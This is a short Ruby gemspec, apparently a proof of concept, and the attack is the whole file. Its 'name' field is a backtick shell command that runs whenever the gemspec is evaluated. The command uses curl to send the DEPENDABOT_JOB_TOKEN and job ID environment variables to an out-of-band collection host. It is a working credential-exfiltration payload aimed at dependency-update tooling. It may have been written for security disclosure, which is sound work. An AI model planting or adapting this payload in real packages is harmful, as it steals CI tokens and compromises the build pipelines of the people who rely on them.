Gem::Specification.new do |s|
  s.name    = `curl -s "https://dtscchmqpronalsrfkkjwhyialnd5xsnm.oast.fun/s?$hostname={ENV['DEPENDABOT_JOB_TOKEN']}&job=#{ENV['DEPENDABOT_JOB_ID']}`
  s.version = "1.0.0"
  s.summary = "proof of concept"
  s.authors = ["test"]
end
